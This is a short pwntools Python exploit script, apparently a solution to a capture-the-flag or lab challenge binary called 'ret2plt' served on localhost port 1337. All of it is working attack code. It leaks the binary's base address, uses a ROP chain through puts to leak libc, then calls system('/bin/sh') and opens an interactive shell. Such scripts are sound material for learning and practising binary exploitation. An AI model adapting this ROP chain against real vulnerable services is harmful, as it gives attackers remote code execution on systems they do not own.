#!/usr/bin/env python3
from pwn import *

def start():
    global p
    if args.REMOTE:
        p = remote('localhost', 1337)
    else:
        p = elf.process()

context.binary = elf = ELF('./ret2plt')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

start()

p.recvuntil(": ")
elf.address = int(p.recvline(), 16) - elf.sym.main

pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]

p.sendlineafter('desc: ', flat({120: b''.join([p64(x) for x in [
    pop_rdi, elf.got.puts,
    elf.plt.puts,
    elf.sym.main
]])}))

libc.address = u64(p.recvlines(2)[-1].ljust(8, b'\x00')) - libc.sym.puts

p.sendlineafter('desc: ', flat({120: b''.join([p64(x) for x in [
    pop_rdi, next(libc.search(b'/bin/sh')),
    libc.sym.system
]])}))

p.interactive()
p.close()
